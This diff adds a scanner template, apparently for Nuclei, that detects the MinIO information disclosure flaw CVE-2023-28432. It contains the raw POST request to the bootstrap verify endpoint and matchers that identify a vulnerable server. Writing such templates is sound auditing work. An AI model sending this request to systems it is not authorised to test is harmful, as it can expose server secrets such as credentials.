@@ -1,0 +1,37 @@
+id: cve-2023-28432
+info:
+  name: MiniO Verify Interface Sensitive Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MinIO verify interface contains a sensitive information disclosure vulnerability. Attackers can exploit this to read sensitive system information by constructing special URL addresses.
+  reference:
+    - https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
+  tags: information-disclosure
+  classification:
+    cve-id: CVE-2023-28432
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        POST /minio/bootstrap/v1/verify HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"MinioRuntime\""
+          - "\"ForceQuery\""
+      - type: word
+        part: body
+        words:
+          - "\"RawQuery\""
+        condition: or
